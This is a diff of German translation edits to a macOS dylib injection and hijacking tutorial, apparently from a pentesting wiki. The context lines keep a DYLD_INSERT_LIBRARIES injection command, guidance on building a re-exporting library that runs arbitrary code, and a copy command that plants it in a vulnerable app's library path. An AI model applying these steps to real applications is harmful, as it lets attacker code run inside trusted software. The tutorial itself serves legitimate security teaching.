@@ -33,7 +33,7 @@ printf("Hello, World!\n");
 return 0;
 }
 ```
-Injection:
+Injektion:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Es ist also möglich, es zu hijacken! Erstellen Sie eine Bibliothek, die **beliebigen Code ausführt und die gleichen Funktionen** wie die legitime Bibliothek durch Reexportierung bereitstellt. Und denken Sie daran, sie mit den erwarteten Versionen zu kompilieren:
+Es ist also möglich, es zu übernehmen! Erstellen Sie eine Bibliothek, die **beliebigen Code ausführt und die gleichen Funktionen** wie die legitime Bibliothek durch Reexportierung bereitstellt. Und denken Sie daran, sie mit den erwarteten Versionen zu kompilieren:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -121,7 +121,7 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Kopiere es schließlich einfach an den **gehijackten Ort**:
+Kopiere es schließlich einfach an den **hijackten Ort**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
@@ -129,7 +129,7 @@ Und **führen** Sie die Binärdatei aus und überprüfen Sie, ob die **Bibliothe
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
-</strong>Usage: [...]
+</strong>Verwendung: [...]
 </code></pre>
 
 > [!NOTE]
